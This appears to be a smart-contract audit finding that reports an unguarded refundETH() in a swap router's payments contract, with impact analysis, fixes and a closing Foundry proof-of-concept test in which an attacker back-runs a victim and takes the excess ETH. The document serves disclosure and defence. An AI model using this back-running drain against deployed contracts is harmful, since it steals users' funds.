**`refundETH()` has no access control** — it unconditionally sends `address(this).balance` to `msg.sender`: [1](#0-0) 

**ETH can be left on the router** — the `pay()` function wraps exactly `value` ETH when `nativeBalance >= value`, leaving the remainder as raw ETH on the contract: [2](#0-1) 

**`multicall` is `payable` with no ETH accounting** — it accepts ETH but does not enforce that all ETH is consumed or returned to the original sender: [3](#0-2)

### Title
Unguarded `refundETH()` allows any caller to drain ETH left on the router by a prior exact-output multicall — (`metric-periphery/contracts/base/PeripheryPayments.sol`)

### Summary
`refundETH()` sends the router's entire ETH balance to `msg.sender` with no check that the caller is the depositor. Any ETH left on the router after a user's exact-output (or over-funded exact-input) multicall can be stolen by an attacker calling `refundETH()` in a subsequent transaction.

### Finding Description
The standard usage pattern for ETH-input swaps is:

```
multicall{value: X}([exactOutputSingle(..., amountInMaximum=X), refundETH()])
```

The `pay()` function wraps only the exact amount needed (`value`) and leaves `nativeBalance - value` as raw ETH on the router. [4](#0-3) 

If the user omits `refundETH()` from their batch — or calls `exactOutputSingle` directly with `msg.value` — the excess ETH persists on the router across transaction boundaries. `refundETH()` has no `msg.sender == depositor` guard: [1](#0-0) 

An attacker monitoring the mempool back-runs the victim's transaction and calls `refundETH()`, receiving all stranded ETH.

The `receive()` guard (`msg.sender != WETH`) only blocks unsolicited ETH pushes; it does not prevent ETH deposited via a `payable` function call from being stranded. [5](#0-4) 

### Impact Explanation
Direct loss of user ETH principal. For exact-output swaps the user cannot know the precise `amountIn` in advance and must over-fund; the excess is at risk. Severity: **High** — no preconditions beyond the user not appending `refundETH()` to their batch, which is a realistic omission for integrators or direct callers.

### Likelihood Explanation
Any user calling `exactOutputSingle{value: X}` directly (not via multicall), or any integrator that builds a multicall without a trailing `refundETH()`, is vulnerable. Attackers can trivially monitor for transactions that leave ETH on the router and back-run them. The test suite itself demonstrates the pattern: [6](#0-5) 

### Recommendation
Either:
1. Track the original depositor in transient storage at `multicall` entry and restrict `refundETH()` to that address, or
2. Auto-refund excess ETH at the end of `multicall` to `msg.sender` unconditionally (eliminating the need for a separate `refundETH()` call), or
3. At minimum, document prominently that `refundETH()` must always be the last call in any ETH-input multicall batch, and consider adding a `recipient` parameter so the refund goes to a specified address rather than `msg.sender`.

pragma solidity ^0.8.35;

// Foundry test: attacker steals excess ETH from victim's exact-output multicall

function test_refundETH_stolen_by_attacker() public {
    address victim  = makeAddr("victim");
    address attacker = makeAddr("attacker");
    vm.deal(victim, 2 ether);

    // Victim calls exactOutputSingle with 2 ether but only ~1000 wei is consumed.
    // Victim forgets to append refundETH() to the batch.
    vm.prank(victim);
    bytes[] memory calls = new bytes[](1);
    calls[0] = abi.encodeWithSelector(
        router.exactOutputSingle.selector,
        IMetricOmmSimpleRouter.ExactOutputSingleParams({
            pool: address(pool),
            tokenIn: address(weth),
            tokenOut: address(token1),
            zeroForOne: true,
            amountOut: 1_000,
            amountInMaximum: type(uint128).max,
            recipient: victim,
            deadline: block.timestamp + 1,
            priceLimitX64: 0,
            extensionData: ""
        })
    );
    router.multicall{value: 2 ether}(calls);

    // Router now holds ~2 ether - amountIn (excess ETH).
    uint256 routerBalance = address(router).balance;
    assertGt(routerBalance, 0, "excess ETH on router");

    // Attacker back-runs and calls refundETH() — no victim check.
    vm.prank(attacker);
    router.refundETH();

    assertEq(attacker.balance, routerBalance, "attacker stole victim ETH");
    assertEq(victim.balance, 0,              "victim lost excess ETH");
}
